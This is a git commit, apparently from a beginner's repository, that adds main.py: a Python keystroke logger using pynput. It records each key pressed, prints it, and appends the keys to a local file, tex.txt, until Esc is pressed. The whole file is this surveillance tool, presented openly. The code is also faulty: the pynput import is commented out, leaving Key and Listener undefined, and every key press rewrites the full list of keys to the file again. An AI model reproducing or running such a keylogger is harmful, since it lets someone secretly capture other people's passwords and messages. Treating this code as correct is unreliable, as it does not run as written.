28059d311aefb387caf271e94c062f1a7a7a7cfd
Shantanu-00 <142408406+Shantanu-00@users.noreply.github.com>
2023-08-16 17:50:26 +0530

    Add files via upload
    Signed-off-by: Shantanu-00 <142408406+Shantanu-00@users.noreply.github.com>

---
+++ main.py
@@ -0,0 +1,20 @@
+#from pynput.keyboard import Key,Listener
+k=[]
+def on_press(key):
+    k.append(key)
+    write_data(k)
+    print(key)
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+def write_data(var):
+    with open("tex.txt","a") as f:
+        for i in var:
+            new_var = str(i).replace("'", '')
+            f.write(new_var)
+            f.write(" ")
+ 
+
+with Listener(on_press=on_press,on_release=on_release) as l:
+    l.join()
